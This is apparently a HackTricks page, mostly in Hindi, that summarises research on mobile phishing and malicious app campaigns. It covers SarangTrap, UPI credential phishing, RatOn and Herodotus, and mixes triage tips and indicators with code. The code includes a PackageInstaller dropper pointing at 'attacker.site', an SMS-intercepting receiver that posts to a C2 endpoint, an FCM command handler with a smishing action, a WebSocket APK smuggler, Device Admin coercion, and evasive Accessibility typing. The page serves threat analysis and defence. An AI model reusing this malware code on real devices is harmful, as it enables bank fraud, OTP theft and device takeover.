# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पृष्ठ उन तकनीकों को कवर करता है जो threat actors द्वारा phishing (SEO, social engineering, fake stores, dating apps, आदि) के माध्यम से **malicious Android APKs** और **iOS mobile-configuration profiles** वितरित करने के लिए उपयोग की जाती हैं।
> सामग्री SarangTrap campaign से अनुकूलित है जिसे Zimperium zLabs (2025) ने उजागर किया और अन्य सार्वजनिक रिसर्च से ली गई है।

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Register dozens of look-alike domains (dating, cloud share, car service…).
– Google में रैंक करने के लिए `<title>` element में स्थानीय भाषा के keywords और emojis का उपयोग करें।
– एक ही landing page पर *दोनों* Android (`.apk`) और iOS install instructions होस्ट करें।
2. **First Stage Download**
* Android: direct link to an *unsigned* or “third-party store” APK.
* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
* पहली बार चलाने पर app एक **invitation / verification code** माँगता है (exclusive access का भ्रम)।
* यह code **POSTed over HTTP** होता है Command-and-Control (C2) को।
* C2 `{"success":true}` जवाब देता है ➜ malware जारी रहता है।
* यदि Sandbox / AV dynamic analysis वैध code सबमिट नहीं करता है तो उसे **no malicious behaviour** दिखेगा (evaison)।
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions केवल **positive C2 response** मिलने के बाद ही माँगे जाते हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* हाल के variants `AndroidManifest.xml` से SMS के लिए `<uses-permission>` **remove** कर देते हैं लेकिन Java/Kotlin code path जो reflection के माध्यम से SMS पढ़ता है उसे छोड़ देते हैं ⇒ इससे static score कम होता है जबकि उन devices पर यह कार्यात्मक रहता है जो permission `AppOps` abuse या पुराने targets की वजह से दे चुके होते हैं।
5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 ने sideloaded apps के लिए **Restricted settings** पेश किए: Accessibility और Notification Listener toggles तब तक greyed out रहते हैं जब तक user स्पष्ट रूप से **App info** में restricted settings की अनुमति न दे।
* Phishing pages और droppers अब step‑by‑step UI निर्देश देते हैं ताकि sideloaded app के लिए **allow restricted settings** किया जा सके और फिर Accessibility/Notification access enable किया जा सके।
* एक नया bypass payload को **session‑based PackageInstaller flow** के माध्यम से install करना है (वही तरीका जो app stores उपयोग करते हैं)। Android app को store‑installed मानता है, इसलिए Restricted settings अब Accessibility को block नहीं करती।
* Triage hint: dropper में `PackageInstaller.createSession/openSession` के लिए grep करें और ऐसे code के लिए देखें जो तुरंत victim को `ACTION_ACCESSIBILITY_SETTINGS` या `ACTION_NOTIFICATION_LISTENER_SETTINGS` पर नेविगेट कर देता है।
6. **Facade UI & Background Collection**
* App स्थानीय रूप से implement किए गए harmless views (SMS viewer, gallery picker) दिखाता है।
* इस दौरान यह निम्न चीज़ें exfiltrate करता है:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
- Optional SMS content (`content://sms`)
Payloads **batch-zipped** किए जाते हैं और `HTTP POST /upload.php` के जरिए भेजे जाते हैं।
7. **iOS Delivery Technique**
* एक single **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि request कर सकता है ताकि डिवाइस को “MDM”-जैसी supervision में enroll किया जा सके।
* Social-engineering निर्देश:
1. Settings खोलें ➜ *Profile downloaded*।
2. तीन बार *Install* पर टैप करें (screenshots phishing page पर)।
3. unsigned profile को Trust करें ➜ attacker को App Store review के बिना *Contacts* & *Photo* entitlement मिल जाता है।
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads phishing URL को Home Screen पर **pin** कर सकते हैं ब्रांडेड icon/label के साथ।
* Web Clips **full‑screen** में चल सकते हैं (browser UI को छुपाते हैं) और उन्हें **non‑removable** चिह्नित किया जा सकता है, जिससे victim को icon हटाने के लिए profile ही डिलीट करना पड़े।
9. **Network Layer**
* Plain HTTP, अक्सर port 80 पर HOST header `api.<phishingdomain>.com` जैसा होता है।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → आसानी से पकड़ा जा सकता है)।

## Red-Team Tips

* **Dynamic Analysis Bypass** – malware assessment के दौरान invitation code चरण को Frida/Objection से automate करें ताकि malicious branch तक पहुँचा जा सके।
* **Manifest vs. Runtime Diff** – `aapt dump permissions` की तुलना runtime `PackageManager#getRequestedPermissions()` से करें; गायब dangerous perms एक red flag हैं।
* **Network Canary** – code entry के बाद unsolid POST bursts का पता लगाने के लिए `iptables -p tcp --dport 80 -j NFQUEUE` कॉन्फ़िगर करें।
* **mobileconfig Inspection** – macOS पर `security cms -D -i profile.mobileconfig` का उपयोग `PayloadContent` सूचीबद्ध करने और अत्यधिक entitlements ढूँढने के लिए करें।

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: invitation code का ऑटो-बायपास</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## संकेतक (सामान्य)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

यह पैटर्न उन अभियानों में देखा गया है जो सरकारी लाभ की थीम का दुरुपयोग करके Indian UPI क्रेडेंशियल्स और OTPs चुराते हैं। ऑपरेटर्स डिलीवरी और रेजिलियंस के लिए प्रतिष्ठित प्लेटफ़ॉर्म्स को चेन करते हैं।

### भरोसेमंद प्लेटफ़ॉर्म्स पर डिलीवरी चेन
- YouTube वीडियो लूर → विवरण में एक शॉर्ट लिंक होता है
- Shortlink → GitHub Pages phishing साइट जो वैध पोर्टल की नकल करती है
- Same GitHub repo में एक APK होस्ट होता है जिसपर नकली “Google Play” बैज होता है जो सीधे फ़ाइल से लिंक करता है
- Dynamic phishing पेज Replit पर लाइव रहते हैं; remote command चैनल Firebase Cloud Messaging (FCM) का उपयोग करता है

### Dropper जिसमें embedded payload और offline install
- First APK एक installer (dropper) है जो वास्तविक malware को `assets/app.apk` पर शिप करता है और cloud detection को कमज़ोर करने के लिए यूज़र को Wi‑Fi/mobile data बंद करने के लिए प्रेरित करता है।
- The embedded payload एक निर्दोष लेबल के तहत install होती है (e.g., “Secure Update”). इंस्टॉलेशन के बाद, installer और payload दोनों अलग‑अलग apps के रूप में मौजूद रहते हैं।

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink के माध्यम से Dynamic endpoint discovery
- Malware एक shortlink से plain-text, comma-separated सूची में मौजूद live endpoints को प्राप्त करता है; सरल string transforms अंतिम phishing page path बनाते हैं।

उदाहरण (संसोधित):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
छद्म-कोड:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” चरण WebView के अंदर डायनामिक endpoint से हमलावर HTML फ़ॉर्म लोड करता है और संवेदनशील फ़ील्ड्स (फ़ोन, बैंक, UPI PIN) को कैप्चर करता है जिन्हें `POST` करके `addup.php` पर भेजा जाता है।

न्यूनतम लोडर:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- पहली बार शुरू करने पर आक्रामक permissions मांगे जाते हैं:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Contacts को loop करके victim के device से smishing SMS mass-send किए जाते हैं।
- Incoming SMS को एक broadcast receiver द्वारा intercept किया जाता है और metadata (sender, body, SIM slot, per-device random ID) के साथ `/addsm.php` पर upload किया जाता है।

Receiver स्केच:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) को एक लचीला C2 के रूप में
- Payload FCM में रजिस्टर होता है; push messages में `_type` field होता है जिसे actions ट्रिगर करने के लिए switch के रूप में उपयोग किया जाता है (उदा., phishing text templates को update करना, behaviours को toggle करना)।

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler का खाका:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK में secondary payload `assets/app.apk` पर मौजूद है
- WebView `gate.htm` से payment लोड करता है और `/addup.php` पर exfiltrates करता है
- SMS exfiltration `/addsm.php` पर
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) जो CSV endpoints लौटाता है
- Apps generic “Update/Secure Update” के रूप में लेबल किए गए
- अनविश्वसनीय Apps में FCM `data` messages जिनमें `_type` discriminator होता है

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

फील्ड में देखा गया सामान्य क्लाइंट फ्लो:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

यह सरल नियंत्रणों से कैसे बचता है:
- कोई स्थैतिक .apk URL प्रदर्शित नहीं होता; payload WebSocket frames से memory में reconstruct किया जाता है.
- URL/MIME/extension filters जो सीधे .apk responses को ब्लॉक करते हैं, वे WebSockets/Socket.IO के माध्यम से tunneled बाइनरी डेटा को मिस कर सकते हैं.
- Crawlers और URL sandboxes जो WebSockets execute नहीं करते, payload को retrieve नहीं कर पाएंगे.

इन्हें भी देखें: WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn केस स्टडी

RatOn banker/RAT campaign (ThreatFabric) एक ठोस उदाहरण है कि कैसे आधुनिक mobile phishing ऑपरेशंस WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, और यहां तक कि NFC-relay orchestration को मिलाते हैं। यह सेक्शन पुन: प्रयोज्य तकनीकों का सार प्रस्तुत करता है।

### स्टेज-1: WebView → native install bridge (dropper)

हमलावर एक attacker पेज की ओर इशारा करने वाला WebView प्रस्तुत करते हैं और एक JavaScript interface inject करते हैं जो एक native installer को expose करता है। HTML button पर एक tap native code को कॉल करता है जो dropper के assets में bundled second-stage APK को install करके उसे सीधे launch कर देता है।

न्यूनतम पैटर्न:

<details>
<summary>Stage-1 dropper न्यूनतम पैटर्न (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

पृष्ठ पर HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
इंस्टॉल के बाद, dropper explicit package/activity के माध्यम से payload शुरू कर देता है:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: अनविश्वसनीय ऐप्स `addJavascriptInterface()` को कॉल कर रहे हैं और WebView के लिए installer-जैसे methods एक्सपोज कर रहे हैं; APK `assets/` के तहत एक embedded secondary payload शिप करता है और Package Installer Session API को invoke करता है।

### अनुमति फ़नल: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 एक WebView खोलता है जो “Access” पेज होस्ट करता है। इसका बटन एक exported method को invoke करता है जो विक्टिम को Accessibility सेटिंग्स पर नेविगेट करता है और दुष्ट सेवा को सक्षम करने का अनुरोध करता है। एक बार अनुमति मिल जाने पर, malware Accessibility का उपयोग आगे के runtime permission डायलॉग्स (contacts, overlay, manage system settings, आदि) पर ऑटो-क्लिक करने के लिए करता है और Device Admin का अनुरोध करता है।

- Accessibility प्रोग्रामैटिक रूप से बाद के prompts को स्वीकार करने में मदद करता है: node-tree में “Allow”/“OK” जैसे बटन ढूंढकर क्लिक dispatch करना।
- Overlay अनुमति जाँच/अनुरोध:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### ओवरले phishing/ransom के माध्यम से WebView
ऑपरेटर निम्नलिखित कमांड दे सकते हैं:
- किसी URL से पूरा-स्क्रीन ओवरले रेंडर करना, या
- inline HTML पास करना जो WebView ओवरले में लोड हो।

संभावित उपयोग: coercion (PIN entry), वॉलेट खोलकर PIN पकड़ना, ransom संदेश भेजना। एक कमांड रखें जो यह सुनिश्चित करे कि ओवरले अनुमति प्रदान की गई है अगर वह गायब हो।

### रिमोट कंट्रोल मॉडल – टेक्स्ट pseudo-screen + screen-cast
- कम-बैंडविड्थ: नियत अंतराल पर Accessibility node tree निकालें, दिखाई देने वाले texts/roles/bounds को serialize करें और C2 को pseudo-screen के रूप में भेजें (कमांड जैसे `txt_screen` एक बार और `screen_live` लगातार)।
- उच्च-निष्ठा: MediaProjection का अनुरोध करें और मांग पर screen-casting/recording शुरू करें (कमांड जैसे `display` / `record`)।

### ATS playbook (bank app automation)
एक JSON टास्क दिए जाने पर, bank app खोलें, Accessibility के माध्यम से UI को text queries और coordinate taps के मिश्रण से ड्राइव करें, और जब पूछा जाए तो पीड़ित का payment PIN दर्ज करें।

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "नया भुगतान"
- "Zadat platbu" → "भुगतान दर्ज करें"
- "Nový příjemce" → "नया प्राप्तकर्ता"
- "Domácí číslo účtu" → "घरेलू खाता संख्या"
- "Další" → "अगला"
- "Odeslat" → "भेजें"
- "Ano, pokračovat" → "हाँ, जारी रखें"
- "Zaplatit" → "भुगतान करें"
- "Hotovo" → "हो गया"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.
### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. फ्लो: अनलॉक करें (चोरी किया गया PIN या प्रदान किया गया पासवर्ड), Security/Recovery पर नेविगेट करें, seed phrase को खुला/दिखाएँ, और इसे keylog/exfiltrate करें। विभिन्न भाषाओं में नेविगेशन को स्थिर करने के लिए locale-aware selectors (EN/RU/CZ/SK) लागू करें।

### Device Admin coercion
Device Admin APIs का उपयोग PIN-capture के अवसर बढ़ाने और पीड़ित को परेशान करने के लिए किया जाता है:

- तत्काल लॉक:
```java
dpm.lockNow();
```
- मौजूदा credential को समाप्त करके बदलाव के लिए मजबूर करें (Accessibility नए PIN/password को capture करता है):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard biometric features को अक्षम करके गैर-बायोमेट्रिक अनलॉक मजबूर करें:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
नोट: हाल के Android पर कई DevicePolicyManager नियंत्रणों के लिए Device Owner/Profile Owner आवश्यक होते हैं; कुछ OEM बिल्ड ढीले हो सकते हैं। हमेशा टारगेट OS/OEM पर वैलिडेट करें।

### NFC रिले संचालन (NFSkate)
Stage-3 एक बाहरी NFC-relay मॉड्यूल (उदा., NFSkate) इंस्टॉल और लॉन्च कर सकता है और रिले के दौरान पीड़ित को मार्गदर्शन करने के लिए उसे HTML टेम्पलेट भी दे सकता है। यह ऑनलाइन ATS के साथ-साथ contactless card-present cash-out को सक्षम बनाता है।

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator कमांड सेट (नमूना)
- UI/स्थिति: `txt_screen`, `screen_live`, `display`, `record`
- सामाजिक: `send_push`, `Facebook`, `WhatsApp`
- ओवरले: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- वॉलेट्स: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- डिवाइस: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- कम्युनिकेशन/रिकॉन: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-आधारित ATS anti-detection: मानव-समान टाइपिंग गति और ड्यूल टेक्स्ट इंजेक्शन (Herodotus)

थ्रेट एक्टर्स अब Accessibility-आधारित ऑटोमेशन को बेसिक बिहेवियर बायोमेट्रिक्स के खिलाफ ट्यून किए गए anti-detection तकनीकों के साथ बढ़ती मात्रा में मिलाते हैं। एक हालिया banker/RAT दो पूरक टेक्स्ट-डिलिवरी मोड और एक ऑपरेटर टॉगल दिखाता है जो रैंडमाइज़्ड कैडेंस के साथ मानव टाइपिंग का अनुकरण करता है।

- डिस्कवरी मोड: कार्रवाई करने से पहले सटीक इनपुट लक्षित करने के लिए selectors और bounds के साथ दिखाई देने वाले नोड्स को सूचीबद्ध करें (ID, text, contentDescription, hint, bounds)।
- ड्यूल टेक्स्ट इंजेक्शन:
- Mode 1 – `ACTION_SET_TEXT` लक्ष्य नोड पर सीधे (स्थिर, कोई कीबोर्ड नहीं);
- Mode 2 – क्लिपबोर्ड सेट + `ACTION_PASTE` फ़ोकस्ड नोड में (जब direct setText ब्लॉक हो तो काम करता है)।
- मानव-समान कैडेंस: ऑपरेटर-प्रदान किए गए स्ट्रिंग को विभाजित करके उसे कैरेक्टर-बाय-कैरेक्टर डिलीवर करें, घटनाओं के बीच 300–3000 ms के रैंडम डिले के साथ ताकि “machine-speed typing” हीयूरिस्टिक्स से बचा जा सके। इसे या तो `ACTION_SET_TEXT` के माध्यम से मान को धीरे-धीरे बढ़ाकर लागू किया जाता है, या एक-एक कर के करैक्टर पेस्ट करके।

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

धोखाधड़ी छुपाने के लिए ब्लॉकिंग ओवरले:
- पूरा-स्क्रीन `TYPE_ACCESSIBILITY_OVERLAY` रेंडर करें, जिसमें ऑपरेटर-नियंत्रित opacity हो; पीड़ित के लिए इसे अपारदर्शी रखें जबकि रिमोट ऑटोमेशन इसके नीचे चलता रहे।
- आमतौर पर उपलब्ध कमांड: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

न्यूनतम ओवरले जिसमें समायोज्य alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
अक्सर देखे जाने वाले Operator control primitives: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (स्क्रीन साझा करना).

## संदर्भ

- [New Android Malware Herodotus मानव व्यवहार की नकल कर के पहचान से बचता है](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [रोमांस का अंधेरा पक्ष: SarangTrap ब्लैकमेल अभियान](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android इमेज संपीड़न लाइब्रेरी](https://github.com/Curzibn/Luban)
- [Android मालवेयर वित्तीय डेटा चुराने के लिए ऊर्जा सब्सिडी का वादा करता है (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [RatOn का उदय: NFC हाइस्ट से रिमोट कंट्रोल और ATS तक (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay कैश-आउट रणनीति (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan इंडोनेशियाई और वियतनामी Android उपयोगकर्ताओं को लक्षित कर रहा है (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [SecuriDropper के साथ Android 13 प्रतिबंधों को बाईपास करना (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Apple devices के लिए Web Clips payload सेटिंग्स](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
